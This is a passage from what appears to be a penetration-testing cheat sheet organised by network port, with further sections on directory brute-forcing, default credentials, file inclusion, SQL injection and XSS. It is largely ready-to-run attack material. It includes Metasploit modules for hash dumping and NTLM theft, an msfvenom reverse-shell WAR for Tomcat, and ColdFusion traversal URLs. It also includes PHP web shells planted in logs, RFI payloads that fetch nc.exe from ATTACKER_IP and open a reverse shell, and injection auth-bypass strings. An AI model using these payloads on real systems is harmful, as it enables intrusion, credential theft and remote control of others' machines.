msf> use auxiliary/scanner/scada/modbus_findunitid

```
### Port 512 - Rexec

\x90

### Port 513 - Rlogin
```bash
# login
apt install rsh-client
rlogin -l <USER> $IP

```
### Port 514 - RSH
```bash
# Login
rsh $IP <Command>
rsh $IP -l domain\user <Command>
rsh domain/user@$IP <Command>
rsh domain\\user@$IP <Command>

```
### Port 515 - line printerdaemon LPd
```bash
# The lpdprint tool included in PRET is a minimalist way to print data directly to an LPD capable printer as shown below:
lpdprint.py hostname filename
```
If you want to learn more about [hacking printers read this page.](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)


### Port 541 - FortiNet SSLVPN

` TODO: ths section `


### Port 548 - Apple Filing Protocol (AFP)
```bash
# enumeration
msf> use auxiliary/scanner/afp/afp_server_info
nmap -sV --script "afp-* and not dos and not brute" -p <PORT> $IP

```
### Port 554 - RTSP

- Web interface, transfer images, streaming
To formulate a Basic authentication element,
one simple has to base 64 encode <username> “:” <password> and add it to the request.
So a new request would look like:
```bash
DESCRIBE rtsp://<ip>:<port> RTSP/1.0\r\nCSeq: 2\r\nAuthorization: Basic YWRtaW46MTIzNA==\r\n\r\n
```
Again note the request is terminated with the double “\r\n”.
The value YWRtaW46MTIzNA== is the base 64 encoded username and password concatenated with “:”.
In this case I have used “admin”/”1234”.
Some simple python scripting to try this out looks like:

```python
import socket
req = "DESCRIBE rtsp://<ip>:<port> RTSP/1.0\r\nCSeq: 2\r\nAuthorization: Basic YWRtaW46MTIzNA==\r\n\r\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.1", 554))
s.sendall(req)
data = s.recv
print data
# Voila! You have access.
```
```bash
# enumeration
nmap -sV --scripts "rtsp-*" -p 554 $IP

```
> To bruteforce:
 https://github.com/Tek-Security-Group/rtsp_authgrinder

### Port 623 / UDP / TCP - IPMI
```bash
# Enumeration
nmap -n -p 623 10.0.0./24
nmap -n-sU -p 623 10.0.0./24
msf > use  auxiliary/scanner/ipmi/ipmi_version

# version
msf > use auxiliary/scanner/ipmi/ipmi_version

```

### Port 631 - Internet Printing Protocol(IPP)
> The Internet Printing Protocol (IPP) is defined in RFC2910 and RFC2911. It's an extendable protocol, for example ‘IPP Everywhere’ is a candidate for a standard in mobile and cloud printing and IPP extensions for 3D printing have been released.
> Because IPP is based on HTTP, it inherits all existing security features like basic/digest authentication and SSL/TLS encryption. To submit a print job or to retrieve status information from the printer, an HTTP POST request is sent to the IPP server listening on port 631/tcp. A famous open-source IPP implementation is CUPS,
> which is the default printing system in many Linux distributions and OS X. Similar to LPD,
> IPP is a channel to deploy the actual data to be printed and can be abused as a carrier for malicious PostScript or PJL files.

### Port 873 - Rsync
```bash
# Enumeration
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0        <--- You receive this banner with the version from the server
@RSYNCD: 31.0        <--- Then you send the same info
# list                <--- Then you ask the sever to list
raidroot             <--- The server starts enumerating
USBCopy
NAS_Public
_NAS_Recycle_TOSRAID    <--- Enumeration finished
@RSYNCD: EXIT         <--- Sever closes the connection

nmap -sV --script "rsync-list-modules" -p 873 $IP
msf> use auxiliary/scanner/rsync/modules_list

#Example using IPv6 and a different port
rsync -av --list-only rsync://[$IP-V6]:8730

# manual
rsync -av --list-only rsync://$IP/shared_name

```
### Port 1026 - Rusersd
```bash
# Enumeration
apt-get install rusers
rusers -l $IP
Sending broadcast for rusersd protocol version 3...
Sending broadcast for rusersd protocol version 2...
tiff       potatohead:console         Sep  2 13:03   22:03
katykat    potatohead:ttyp5           Sep  1 09:35      14

```

### Port 1028 / 1099 - Java RMI
```bash
# Enumeration

# Basically this service could allow you to execute code.
msf > use auxiliary/scanner/misc/java_rmi_server
msf > use auxiliary/gather/java_rmi_registry
nmap -sV --script "rmi-dumpregistry or rmi-vuln-classloader" -p 1028 $IP

# Reverse Shell
msf > use exploit/multi/browser/java_rmi_connection_impl

```
### Port 1030/1032/1033/1038

- Used by RPC to connect in domain network.

### Port 1433 - MSSQL
```bash
# info

nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
msf> use auxiliary/scanner/mssql/mssql_ping

nmap -p 1433 -sU --script=ms-sql-info.nse $IP
sqsh -S $IP -U <Username> -P <Password> -D <Database>
# OR
sqsh -S $IP -U sa
    xp_cmdshell 'date'
    go

#msfconsole

#Set USERNAME, RHOSTS and PASSWORD
#Set DOMAIN and USE_WINDOWS_AUTHENT if domain is used

#Steal NTLM
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer #Steal NTLM hash, before executing run Responder

#Info gathering
msf> use admin/mssql/mssql_enum #Security checks
msf> use admin/mssql/mssql_enum_domain_accounts
msf> use admin/mssql/mssql_enum_sql_logins
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/scanner/mssql/mssql_hashdump
msf> use auxiliary/scanner/mssql/mssql_schemadump

#Search for insteresting data
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/admin/mssql/mssql_idf

#Privesc
msf> use exploit/windows/mssql/mssql_linkcrawler
msf> use admin/mssql/mssql_escalate_execute_as #If the user has IMPERSONATION privilege, this will try to escalate
msf> use admin/mssql/mssql_escalate_dbowner #Escalate from db_owner to sysadmin

#Code execution
msf> use admin/mssql/mssql_exec #Execute commands
msf> use exploit/windows/mssql/mssql_payload #Uploads and execute a payload

#Add new admin user from meterpreter session
msf> use windows/manage/mssql_local_auth_bypass

```

### Port 1521 - Oracle
```bash
oscanner -s $IP -P 1521
tnscmd10g version -h $IP
tnscmd10g status -h $IP
nmap -p 1521 -A $IP
nmap -p 1521 --script=oracle-tns-version,oracle-sid-brute,oracle-brute
#MSF
use auxiliary/admin/oracle
use auxiliary/scanner/oracle
```

### Port 1723 - PPTP
```bash
# Enumeration
nmap –Pn -sSV -p1723 $IP

```
### Port 1883 - MQTT (Mosquitto)

To connect to a MQTT service you can use: https://github.com/bapowell/python-mqtt-client-shell
```bash
> connect (NOTICE that you need to indicate before this the params of the connection, by default 127.0.0.1:1883)
> subscribe "#" 1
> subscribe "$SYS/#"

```
Or you could run this code to try to connect to a MQTT service without authentication, subscribe to every topic and listen them:
```python
#This is a modified version of https://github.com/Warflop/IOT-MQTT-Exploit/blob/master/mqtt.py
import paho.mqtt.client as mqtt
import time
import os

HOST = "127.0.0.1"
PORT = 1883

def on_connect(client, userdata, flags, rc):
    client.subscribe('#', qos=1)
    client.subscribe('$SYS/#')

def on_message(client, userdata, message):
    print('Topic: %s | QOS: %s  | Message: %s' % (message.topic, message.qos, message.payload))

def main():
    client = mqtt.Client()
    client.on_connect = on_connect
    client.on_message = on_message
    client.connect(HOST, PORT)
    client.loop_start()
    #time.sleep(10)
    #client.loop_stop()

if __name__ == "__main__":
    main()

```

### Port 2049 - NFS TNS Listener
```bash
# enumeration
# nmap scripts
nfs-ls #List NFS exports and check permissions
nfs-showmount #Like showmount -e
nfs-statfs #Disk statistics and info from NFS share

# msf modul
scanner/nfs/nfsmount #Scan NFS mounts and list permissions

# Mounting
showmount -e $IP
mount -t nfs [-o vers=2] $IP:<remote_folder> <local_folder> -o nolock

```

### Port 2100 - Oracle XML DB
```sh
#FTP
    sys:sys
    scott:tiger
```
 - list of passwords :
https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm

### Port 3260 - ISCSI
```bash
# Enumeration
nmap -sV --script=iscsi-info -p 3260 $IP

# Manual enumeration
sudo apt-get install open-iscsi
iscsiadm -m discovery -t sendtargets -p $IP:3260
123.123.123.123:3260,1 iqn.1992-05.com.emc:fl1001433000190000-3-vnxe
[2a01:211:7b7:1223:211:32ff:fea9:fab9]:3260,1 iqn.2000-01.com.synology:asd3.Target-1.d0280fd382
[fe80::211:3232:fab9:1223]:3260,1 iqn.2000-01.com.synology:Oassdx.Target-1.d0280fd382

# Then you catch the 2nd part of the printed string of each line
iscsiadm -m node --targetname="iqn.1992-05.com.emc:fl1001433000190000-3-vnxe" -p 123.123.123.123:3260 --login
Logging in to [iface: default, target: iqn.1992-05.com.emc:fl1001433000190000-3-vnxe, portal: 123.123.123.123,3260] (multiple)
Login to [iface: default, target: iqn.1992-05.com.emc:fl1001433000190000-3-vnxe, portal: 123.123.123.123,3260] successful.

# logout
iscsiadm -m node --targetname="iqn.1992-05.com.emc:fl1001433000190000-3-vnxe" -p 123.123.123.123:3260 --logout

```

### Port 3299 - SAPRouter

Copy of: https://blog.rapid7.com/2014/01/09/piercing-saprouter-with-metasploit/
```bash
msf> use auxiliary/scanner/sap/sap_service_discovery
msf auxiliary(sap_service_discovery) > set RHOSTS $IP
RHOSTS => $IP
msf auxiliary(sap_service_discovery) > run

[*] [SAP] Beginning service Discovery '1.2.3.101'

[+] 1.2.3.101:3299      - SAP Router OPEN
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

msf > use auxiliary/scanner/sap/sap_router_info_request

```

### Port 3306 - MySQL
```bash
# Enumeration
nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 $IP

# Use of metasploit
msf> use auxiliary/scanner/mysql/mysql_version
msf> use uxiliary/scanner/mysql/mysql_authbypass_hashdump
msf> use auxiliary/scanner/mysql/mysql_hashdump #Creds
msf> use auxiliary/admin/mysql/mysql_enum #Creds
msf> use auxiliary/scanner/mysql/mysql_schemadump #Creds
msf> use exploit/windows/mysql/mysql_start_up #Execute commands Windows, Creds

# Connect Remote
mysql -h <Hostname> -u root
mysql -h <Hostname> -u root@localhost

```
### Port 3339 - Oracle web interface

Basic info about web service (apache, nginx, IIS)

### Port 3389 - RDP
```bash
# enum
nmap -p 3389 --script=rdp-vuln-ms12-020.nse $IP
nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 <IP>

# Connect with known credetials/hash
rdesktop -u <username> $IP
rdesktop -d <domain> -u <username> -p <password> $IP
xfreerdp /u:[domain\]<username> /p:<password> /v:$IPP
xfreerdp /u:[domain\]<username> /pth:<hash> /v:$IP

# Check known credentials
rdp_check <domain>\<name>:<password>@$IP

[Post-Exploitation](https://github.com/JoelGMSec/AutoRDPwn)

# Launch CMD with other cretentials so they are used in the network
runas /netonly /user<DOMAIN>\<NAME> "cmd.exe" ::The password will be prompted

```

### Port 3632 - distcc

Resources :
```bash
# DistCC Daemon Command Execution
​# https://www.rapid7.com/db/modules/exploit/unix/misc/distcc_exec​
```

### Port 4506 - SaltStack (Salt Master)
```bash
# TO DO 

https://nvd.nist.gov/vuln/detail/CVE-2020-11651
```


### Port 4369 - Erlang Port Mapper Daemon (epmd)

```bash
# Enumeration
echo -n -e "\x00\x01\x6e" | nc -vn $IP 4369

# Via Erlang, Download package from here: https://www.erlang-solutions.com/resources/download.html
dpkg -i esl-erlang_23.0-1~ubuntu~xenial_amd64.deb
apt-get install erlang
erl # Once Erlang is installed this will prompt an erlang terminal
1> net_adm:names('<HOST>'). # This will return the listen addresses

# Automatic
nmap -sV -Pn -n -T4 -p 4369 --script epmd-info $IP

PORT     STATE SERVICE VERSION
4369/tcp open  epmd    Erlang Port Mapper Daemon
| epmd-info:
|   epmd_port: 4369
|   nodes:
|     bigcouch: 11502
|     freeswitch: 8031
|     ecallmgr: 11501
|     kazoo_apps: 11500
|_    kazoo-rabbitmq: 25672

```

### Port 5353 / UDP - Multicast DNS (mDNS)

```bash
# Enumeration
nmap -Pn -sUC -p5353 192.168.1.2

Starting Nmap 6.46 (http://nmap.org) at 2015-01-01 10:30 GMT
Nmap scan report for 192.168.1.2
PORT     STATE SERVICE
5353/udp open  zeroconf

```

### Port 5355 UDP / TCP - Link-Local Multicast Name Resolution (LLMNR) 

LLMNR + NBT-NS Poisoning:
1. The victim machine wants to connecet to print server at \\\printserver, but types in \\\pintserver.  
2. The DNS server responds to the victim saying that it doesn’t know that host.
3. The victim then asks if there is anyone on the local network that knows the location of \\\pintserver using LLMNR
4. The attacker responds to the victim saying that it is the \\\pintserver
5. The victim believes the attacker and sends its own username and NTLMv2 hash to the attacker.
6. The attacker can now crack the hash to discover the password

```bash
# Metasploit LLMNR Spoofer Module
msf> use auxiliary/spoof/llmnr/llmnr_response 

# SpiderLab's Responder
wget https://github.com/lgandx/Responder
python Responder.py -I <INTERFACE> -wfv


```

Attack Mitigation:
* Disable both LLMNR and NBT-NS
* https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning



### Port 5432 / 5433 -  Postgresql

```bash
# Connect
psql -U <myuser> # Open psql console with user

# Remote connection
psql -h $IP -U <username> -d <database>
psql -h $IP -p <port> -U <username> -W <password> <database>

psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
#To read a file:
CREATE TABLE demo(t text);
COPY demo from '[FILENAME]';
SELECT * FROM demo;

# Enumeration
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection

```
### Port 5671 - AMQP

```python
import amqp
#By default it uses default credentials "guest":"guest"
conn = amqp.connection.Connection(host="<IP>", port=5672, virtual_host="/")
conn.connect()
for k, v in conn.server_properties.items():
    print(k, v)
```
```bash
# Automatic
nmap -sV -Pn -n -T4 -p 5672 --script amqp-info $IP
```

### Port 5985 / 5986 - WinRM

5985/tcp (HTTP)
5986/tcp (HTTPS)

```bash
gem install evil-winrm

evil-winrm -i $IP -u Administrator -p 'password1'

# Pass the hash with evil-winrm
evil-winrm -i $IP -u Administrator -H 'hash-pass'
```

```ruby
#Code extracted from here: https://alamot.github.io/winrm_shell/
require 'winrm-fs'

# Author: Alamot
# To upload a file type: UPLOAD local_path remote_path
# e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txt


conn = WinRM::Connection.new(
  endpoint: 'https://IP:PORT/wsman',
  transport: :ssl,
  user: 'username',
  password: 'password',
  :no_ssl_peer_verification => true
)


class String
  def tokenize
    self.
      split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
      select {|s| not s.empty? }.
      map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
  end
end


command=""
file_manager = WinRM::FS::FileManager.new(conn)


conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
        print(output.output.chomp)
        command = gets
        if command.start_with?('UPLOAD') then
            upload_command = command.tokenize
            print("Uploading " + upload_command[1] + " to " + upload_command[2])
            file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|
                puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")
            end
            command = "echo `nOK`n"
        end
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print(stdout)
            STDERR.print(stderr)
        end
    end
    puts("Exiting with code #{output.exitcode}")
end
```

```
#Msf
msf > use auxiliary/scanner/winrm/winrm_login
    #Bruteforce
msf > use auxiliary/scanner/winrm/winrm_login
    #Running Commands
msf > use auxiliary/scanner/winrm/winrm_cmd
    #Getting Shells!
msf > use exploit/windows/winrm/winrm_script_exec

```

### Port 5800 / 5801 / 5900 / 5901 -  VNC

Be sure to decrypt any VNC password files with the following tool:
* https://github.com/jeroennijhof/vncpwd

```bash
# Enumeration
nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p <PORT> $IP
msf> use auxiliary/scanner/vnc/vnc_none_auth

# Connect to vnc using Kali
vncviewer [-passwd passwd.txt] $IP::5901

```
### Port 5984 - CouchDB

```bash
# Enumeration
nmap -sV --script couchdb-databases,couchdb-stats -p 5984 $IP
msf> use auxiliary/scanner/couchdb/couchdb_enum

curl http://IP:5984/
# The reply should look something like:
{"couchdb":"Welcome","version":"0.10.1"}

```
References :
* https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html​

### Port 6000 - X11

```bash
# enumeration
nmap -sV --script x11-access -p 6000 $IP
msf> use auxiliary/scanner/x11/open_x11

# Remote Desktop View Way from:
https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref

# Get Shell
msf> use exploit/unix/x11/x11_keyboard_exec

```

### Port 6379 - Redis

```bash
# Enumeration
nmap --script redis-info -sV -p 6379 $IP
msf> use auxiliary/scanner/redis/redis_server

https://github.com/Avinash-acid/Redis-Server-Exploit
python redis.py 10.10.10.160 redis

# redis-tools
sudo apt-get install redis-tools
redis-cli -h 192.168.0.24
192.168.0.24:6379> info
192.168.0.24:6379> CONFIG GET *
192.168.0.24:6379> keys *
192.168.0.24:6379> get 351115ba5f690fb9b1bdc1b41e673a94 #This is a key list on the last command

# auto exploit
redis-cli -h 192.168.0.24
192.168.0.24:6379> info
192.168.0.24:6379> CONFIG GET *
192.168.0.24:6379> keys *
192.168.0.24:6379> get 351115ba5f690fb9b1bdc1b41e673a94 #This is a key list on the last command

```
### Port 8009 - Apache JServ Protocol (AJP)

* https://diablohorn.com/2011/10/19/8009-the-forgotten-tomcat-port/
```bash
# Enumeration
nmap -sV --script ajp-auth,ajp-headers,ajp-methods,ajp-request -n -p 8009 $IP

```
### Port 8172 - MsDeploy
Microsoft IIS Deploy port
```bash
$IP:8172/msdeploy.axd
```

### Port 8080 - Apache Tomcat
```bash
# Credentials are found in the following path (download a copy of tomcat and check manually):
# /etc/tomcat9/tomcat-users.xml
# /usr/share/tomcat9/etc/tomcat-users.xml
# /var/lib/ucf/cache/:etc:tomcat9:tomcat-users.xml

# If you have credentials, you can do the following:
apt install tomcatmanager
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4444 -f war > shell.war

tomcat-manager
> connect http://10.10.10.194:8080/manager tomcat $3cureP4s5w0rd123!
> deploy local /path/to/shell.war /manager/qernel.war

# With metasploit
msf > use exploit/multi/http/tomcat_mgr_upload
msf exploit(tomcat_mgr_upload) > show options

```

### Port 8500 (TCP) - Macromedia/Adobe ColdFusion Web Server
```bash
# The website in question must have a ColdFusion administrator available.
# Try the following local file disclosure (LFD) to get the password hash for the administrator 

# ColdFusion 6
http://$IP:8500/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX\lib\password.properties%00en

# ColdFusion 7
http://$IP:8500/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX7\lib\password.properties%00en	

# ColdFusion 8
http://$IP:8500/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en

# All versions
http://$IP:8500/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties%00en

# Try cracking the hash with crackstation or follow the guide below
```
References:
* https://nets.ec/Coldfusion_hacking


### Port 9042 / 9160 -  Cassandra
```bash
#Enumeration
pip install cqlsh
cqlsh $IP
#Basic info enumeration
SELECT cluster_name, thrift_version, data_center, partitioner, native_protocol_version, rack, release_version from system.local;
#Keyspace enumeration
SELECT keyspace_name FROM system.schema_keyspaces;
desc <Keyspace_name>    #Decribe that DB
desc system_auth        #Describe the DB called system_auth
SELECT * from system_auth.roles;  #Retreive that info, can contain credential hashes
SELECT * from logdb.user_auth;    #Can contain credential hashes
SELECT * from logdb.user;
SELECT * from configuration."config";
# auto
nmap -sV --script cassandra-info -p 9042,9160 $IP

```

### Port 9100 - Raw Printing (JetDirect, AppSocket, PDL-datastream)
```bash
# Enumeration
nmap -sV --script pjl-ready-message -p <PORT> $IP
msf> use auxiliary/scanner/printer/printer_env_vars
msf> use auxiliary/scanner/printer/printer_list_dir
msf> use auxiliary/scanner/printer/printer_list_volumes
msf> use auxiliary/scanner/printer/printer_ready_message
msf> use auxiliary/scanner/printer/printer_version_info
msf> use auxiliary/scanner/printer/printer_download_file
msf> use auxiliary/scanner/printer/printer_upload_file
msf> use auxiliary/scanner/printer/printer_delete_file
```
[Printers Hacking tool](https://github.com/RUB-NDS/PRET)

### Port 9200 - Elasticsearch

```bash
# Enumeration
firefox http://$IP:9200/
```
You can gather all the indices accessing `http://10.10.10.115:9200/_cat/indices?v`
```sh
health status index   uuid                   pri rep docs.count docs.deleted store.size pri.store.size
green  open   .kibana 6tjAYZrgQ5CwwR0g6VOoRg   1   0          1            0        4kb            4kb
yellow open   quotes  ZG2D1IqkQNiNZmi2HRImnQ   5   1        253            0    262.7kb        262.7kb
yellow open   bank    eSVpNfCfREyYoVigNWcrMw   5   1       1000            0    483.2kb        483.2kb

```
Resources:
* https://www.elastic.co/what-is/elasticsearch

### Port  10000 - Network Data Management Protocol (ndmp)

```bash
# Enumeration
nmap -n -sV --script "ndmp-fs-info or ndmp-version" -p 10000 $IP

```

### Port 10050 - Zabbix-Agent [TCP/UDP]

Check if a website is running on `http://$IP/zabbix`

(Authenticated) Grabbing HostID via JSON-RPC
```bash
# An authorization tokem must be obtained
curl -X POST -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0","method":"apiinfo.version","id":1,"auth":null,"params":{}}' --url http://$IP/zabbix/api_jsonrpc.php 

# This will return a token "result" e.g

# With the authorization token, the following command can be run to fetch the HostIDs
curl -i -X POST -H 'Content-type:application/json' -d '{"jsonrpc":"2.0","method":"user.login","params":{"user":"<USERNAME>","password":"<PASSWORD>"},"auth":null,"id":0}' --url http://$IP/zabbix/api_jsonrpc.php
```

(Authenticated) Grabbing HostID via Python Script
```python
from pyzabbix import ZabbixAPI

zapi = ZabbixAPI("http://10.10.10.108/zabbix")
zapi.login("<USERNAME>", "<PASSWORD>")
print("Connected to Zabbix API Version %s" % zapi.api_version())
for h in zapi.host.get(output="extend"):
    print(h['hostid'])
```

References:
* https://www.zabbix.com/documentation/3.0/manual/api/reference/host/get

### Port 11211 - Memcache

To ex-filtrate all the information saved inside a memcache instance you need to:
* 1  Find slabs with active items
* 2  Get the key names of the slabs detected before
* 3  Ex-filtrate the saved data by getting the key names

```bash
echo "version" | nc -vn $IP 11211      #Get version
echo "stats" | nc -vn $IP 11211        #Get status
echo "stats slabs" | nc -vn $IP 11211  #Get slabs
echo "stats items" | nc -vn $IP 11211  #Get items of slabs with info
echo "stats cachedump <number> 0" | nc -vn $IP 11211  #Get key names
echo "get <item_name>" | nc -vn $IP 11211  #Get saved info

#This php will just dumo the keys, you need to use "get <item_name> later"
sudo apt-get install php-memcached
php -r '$c = new Memcached(); $c->addServer("localhost", 11211); var_dump( $c->getAllKeys() );'

# auto mode ;)
nmap -n -sV --script memcached-info -p 11211 $IP   #Just gather info
msf > use auxiliary/gather/memcached_extractor      #Extracts saved data
msf > use auxiliary/scanner/memcached/memcached_amp #Check is UDP DDoS amplification attack is possible

#Memcstat
sudo apt install libmemcached-tools
memcstat --servers=$IP

# Nmap
nmap -n -sV --script memcached-info -p 11211 $IP
```

### Port 15672 - RabbitMQ Management

Management Plugin:
* https://www.rabbitmq.com/management.html


The default credentials are "guest":"guest"
```bash
# Enumeration
rabbitmq-plugins enable rabbitmq_management
service rabbitmq-server restart

```

### Port 27017 / 27018 - MongoDB

Python script
```python
from pymongo import MongoClient
client = MongoClient(host, port, username=username, password=password)
client.server_info() #Basic info
#If you have admin access you can obtain more info
admin = client.admin
admin_info = admin.command("serverStatus")
cursor = client.list_databases()
for db in cursor:
    print(db)
    print(client[db["name"]].list_collection_names())
#If admin access, you could also dump the database 
```

```bash
# Some MongoDB commands:
show dbs
use <db>
show collections
db.<collection>.find()  #Dump the collection
db.<collection>.count() #Number of records of the collection
db.current.find({"username":"admin"})  #Find in current db the username admin

# Automatic
nmap -sV --script "mongo* and default" -p 27017 $IP

# Login
mongo $IP
mongo $IP:<PORT>
mongo $IP:<PORT>/<DB>
mongo <database> -u <username> -p '<password>'

nmap -n -sV --script mongodb-brute -p 27017 $IP

# Look inside /opt/bitnami/mongodb/mongodb.conf to know if credentials are needed:
grep "noauth.*true" /opt/bitnami/mongodb/mongodb.conf | grep -v "^#" #Not needed
grep "auth.*true" /opt/bitnami/mongodb/mongodb.conf | grep -v "^#\|noauth" #Not needed

## NoSQL MongoDB Injection
# https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration
python3 nosqli-user-pass-enum.py  -u http://$IP/ -up username -pp password -ep username -m POST

```

### Port 44818 / UDP / TCP - EthernetIP

* en.wikipedia.org/wiki/EtherNet/IP
```bash
# Enumeration
nmap -n -sV --script enip-info -p 44818 $IP
pip3 install cpppo
python3 -m cpppo.server.enip.list_services [--udp] [--broadcast] --list-identity -a $IP
```

### Port 47808 / udp - BACNet

```bash
# Enumeration
pip3 install BAC0
import BAC0
bbmdIP = '$IP:47808'
bbmdTTL = 900
bacnet = BAC0.connect(bbmdAddress=bbmdIP, bbmdTTL=bbmdTTL) #Connect
bacnet.vendorName.strValue

# Or just use nmap
nmap --script bacnet-info --script-args full=yes -sU -n -sV -p 47808 $IP

```

### Port 50030 / 50060 / 50070 / 50075 / 50090 - Hadoop

Basic Information

Apache Hadoop is an open source framework supporting the distributed storage and processing of large datasets using computer clusters.
Storage is handled by the Hadoop Distributed File System (HDFS) and processing is performed by using MapReduce and other applications (e.g., Apache Storm, Flink, and Spark) via YARN.

### Unknown ports
```bash
amap -d $IP 8000

# netcat: makes connections to ports. Can echo strings or give shells:

nc -nv $IP 110

```
Try zone transfer for subdomains:

```bash
dig axfr @$IP hostname.box
dnsenum $IP
dnsrecon -d domain.com -t axfr

```

# Unsorted

### Url Brutforce

```bash
# Ffuf
ffuf -c -e '.htm','.php','.html' -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u https://$IP/FUZZ

# Dirb not recursive
dirb http://$IP -r -o dirb-$IP.txt

# Wfuzz
wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://$IP/FUZZ

gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web_Content/common.txt -x php -e # add -k for https

# dirseache
git clone https://github.com/maurosoria/dirsearch.git
cd dirsearch
./dirsearch.py -u http://$IP -e php,txt,html -x 404
./dirsearch.py -r -f -u https://google.com --extensions=htm,html,asp,aspx,txt -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 40

# Crawl:
dirhunt https://url.com/
hakrwaler https://url.com/

# Sub domain brut
https://github.com/aboul3la/Sublist3r

```
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Subdomains%20Enumeration.md

### Default_Weak login
```

site:domain.com password

admin admin
admin password
admin <blank>
admin <servicename>
root root
root admin
root password
root <servicename>
<username if you have> password
<username if you have> admin
<username if you have> username
username <servicename>

```
> list of user names

https://github.com/danielmiessler/SecLists/tree/master/Usernames

### LFI-RFI

```bash
#Fimap
fimap -u "http://$IP/example.php?test="

curl -s http://$IP/gallery.php?page=/etc/passwd

#Use in "page="

php://filter/convert.base64-encode/resource=/etc/passwd

http://$IP/maliciousfile.txt%00

php://filter/convert.base64-encode/resource=../config.php

php://filter/convert.base64-encode/resource=../../../../../boot.ini

# LFI Windows  :warning:
LANG=../../windows/system32/drivers/etc/hosts%00
LANG=../../xampp/apache/logs/access.log%00&cmd=ipconfig

# Contaminating log files
root@kali:~# nc -v $IP 80
$IP: inverse host lookup failed: Unknown host
(UNKNOWN) [$IP] 80 (http) open
 <?php echo shell_exec($_GET['cmd']);?>

# Contaminating log files
[root:~]# nc -v $IP 80
$IP: inverse host lookup failed: Unknown host
(UNKNOWN) [$IP] 80 (http) open
 <?php echo shell_exec($_GET['cmd']);?>

# RFI:
http://$IP/addguestbook.php?LANG=http://$IP:31/evil.txt%00
Content of evil.txt:
<?php echo shell_exec("nc.exe 10.11.0.105 4444 -e cmd.exe") ?>

# PHP Filter:
http://$IP/index.php?m=php://filter/convert.base64-encode/resource=config

# RFI over SMB (Windows)
cat php_cmd.php
    <?php echo shell_exec($_GET['cmd']);?>
# Start SMB Server in attacker machine and put evil script
# Access it via browser (2 request attack):
lang=\\ATTACKER_IP\ica\php_cmd.php&cmd=powershell -c Invoke-WebRequest -Uri "http://10.10.14.42/nc.exe" -OutFile "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe"
lang=\\ATTACKER_IP\ica\php_cmd.php&cmd=powershell -c "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe" -e cmd.exe ATTACKER_IP 1234

```
> read this :
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion

### Sql-injection

```bash
#POST
sqlmap.py -r search-test.txt

#GET
sqlmap -u "http://$IP/index.php?id=1" --dbms=mysql

#FULL ;)
sqlmap -u 'http://$IP:1337/978345210/index.php' --forms --dbs --risk=3 --level=5 --threads=4 --batch

# NoSQL
' || 'a'=='a

#in URL
username[$ne]=0xtz&password[$ne]=0xtz  # :joy: i'm never use this user name

#in JSON
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt":""}, "password": {"$gt":""}}

```

[sql-injection-authentication-bypass-cheat-sheet](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/)
[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

### XSS
```javascript
<script>alert("XSS")</script>
<script>alert(1)</script>

